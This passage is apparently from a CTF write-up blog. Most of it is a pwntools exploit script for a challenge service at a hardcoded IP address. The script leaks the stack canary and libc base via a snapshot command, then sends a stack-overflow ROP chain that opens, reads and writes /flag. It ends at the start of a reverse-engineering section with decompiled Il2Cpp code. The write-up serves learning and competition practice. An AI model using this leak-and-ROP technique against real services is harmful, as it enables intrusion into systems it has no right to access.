</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;127.0.0.1 10000&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;223.6.249.127:56463&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./pwn&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span><span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;tmux splitw -h -l 170&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#io = process(binary)</span>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#pay = flat({</span>
</span></span><span class=line><span class=cl><span class=c1>#},filler=b&#39;\x00&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#gdb.attach(io,gdbscript=gs)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>set_size</span><span class=p>(</span><span class=n>iot</span><span class=p>,</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span>  <span class=o>=</span> <span class=s1>&#39;SET &#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>set_head</span><span class=p>(</span><span class=n>iot</span><span class=p>,</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span>  <span class=o>=</span> <span class=s1>&#39;SETHEAD &#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>set_body</span><span class=p>(</span><span class=n>iot</span><span class=p>,</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span>  <span class=o>=</span> <span class=s1>&#39;SETBODY &#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>set_sync</span><span class=p>(</span><span class=n>iot</span><span class=p>,</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span>  <span class=o>=</span> <span class=s1>&#39;SETSYNC &#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>echo</span><span class=p>(</span><span class=n>iot</span><span class=p>,</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span>  <span class=o>=</span> <span class=s1>&#39;ECHO&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>snaphot</span><span class=p>(</span><span class=n>iot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=s1>&#39;SNAPSHOT&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>diag</span><span class=p>(</span><span class=n>iot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=s1>&#39;DIAG&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sync</span><span class=p>(</span><span class=n>iot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=s1>&#39;SYNC&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>backup</span><span class=p>(</span><span class=n>iot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=s1>&#39;QUEUE BACKUP&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>export</span><span class=p>(</span><span class=n>iot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=s1>&#39;QUEUE EXPORT&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>health</span><span class=p>(</span><span class=n>iot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=s1>&#39;QUEUE HEALTH&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show_tasks</span><span class=p>(</span><span class=n>iot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=s1>&#39;SHOW TASKS&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show_logs</span><span class=p>(</span><span class=n>iot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=s1>&#39;SHOW LOGS&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tick</span><span class=p>(</span><span class=n>iot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=s1>&#39;TICK&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_tid</span><span class=p>(</span><span class=n>iot</span><span class=p>,</span> <span class=n>offset</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>set_sync</span><span class=p>(</span><span class=n>iot</span><span class=p>,</span> <span class=mi>56</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sync</span><span class=p>(</span><span class=n>iot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x30</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iot</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;TID=&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>tid</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>iot</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>tid</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>tid</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span> <span class=c1># body</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span> <span class=c1># head</span>
</span></span><span class=line><span class=cl><span class=n>p3</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p4</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set head = 0x40000000</span>
</span></span><span class=line><span class=cl><span class=n>tid</span> <span class=o>=</span> <span class=n>get_tid</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>set_body</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span><span class=n>tid</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p1</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set body = 0x40000000</span>
</span></span><span class=line><span class=cl><span class=n>tid</span> <span class=o>=</span> <span class=n>get_tid</span><span class=p>(</span><span class=n>p2</span><span class=p>,</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>set_head</span><span class=p>(</span><span class=n>p2</span><span class=p>,</span><span class=n>tid</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#pause()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set size = 0x40000000</span>
</span></span><span class=line><span class=cl><span class=n>tid</span> <span class=o>=</span> <span class=n>get_tid</span><span class=p>(</span><span class=n>p4</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>set_size</span><span class=p>(</span><span class=n>p4</span><span class=p>,</span><span class=n>tid</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p4</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p5</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>snaphot</span><span class=p>(</span><span class=n>p3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>p3</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0xec0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>hexdump</span><span class=p>(</span><span class=n>leak</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=mh>0x408</span><span class=p>:</span><span class=mh>0x408</span><span class=o>+</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=mh>0xeb8</span><span class=p>:</span><span class=mh>0xeb8</span><span class=o>+</span><span class=mi>8</span><span class=p>])</span> <span class=o>-</span> <span class=mh>0x60d88</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p3</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl><span class=n>libc_rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>libc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rax</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rax&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>rdi</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rdi&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>rsi</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rsi&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>rdx</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x00000000000b503c</span> <span class=c1># pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;syscall&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>mov_</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x000000000013b991</span> <span class=c1># mov qword ptr [rsi], rdi ; ret</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdin_&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>rop</span>  <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;/flag&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>mov_</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=n>m</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rax</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span>  <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>*</span><span class=n>m</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>*</span><span class=n>m</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=mh>0x400</span> <span class=o>*</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>*</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>rop</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>echo</span><span class=p>(</span><span class=n>p5</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span> <span class=c1># overflow</span>
</span></span><span class=line><span class=cl><span class=n>p5</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1>#p5.shutdown(&#39;send&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=reverse>Reverse</h1><h2 id=pixelflow>pixelflow</h2><p>用Il2CppDumperr给GameAssembly.dll恢复符号，函数主逻辑在状态机Controller__Check_d__18__MoveNext</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Rust data-lang=Rust><span class=line><span class=cl><span class=n>void</span><span class=w> </span><span class=n>Controller__Check_d__18__MoveNext</span><span class=p>(</span><span class=n>Controller__Check_d__18_o</span><span class=w> </span><span class=o>*</span><span class=n>this</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=n>MethodInfo</span><span class=w> </span><span class=o>*</span><span class=n>method</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>!</span><span class=n>byte_180F4C9B1</span><span class=w> </span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=o>&amp;</span><span class=n>Method_System_Runtime_CompilerServices_AsyncVoidMethodBuilder_AwaitUnsafeOnCompleted_TaskAwaiter_byte_____Controller__Check_d__18___</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>method</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=o>&amp;</span><span class=n>Method_System_Runtime_CompilerServices_AsyncVoidMethodBuilder_AwaitUnsafeOnCompleted_TaskAwaiter__Controller__Check_d__18___</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>v3</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Method_Controller__Check_b__18_0__</span><span class=p>,</span><span class=w> </span><span class=n>v4</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Method_Controller__Check_b__18_1__</span><span class=p>,</span><span class=w> </span><span class=n>v5</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Method_Controller__Check_b__18_2__</span><span class=p>,</span><span class=w> </span><span class=n>v6</span><span class=p>);</span><span class=w>
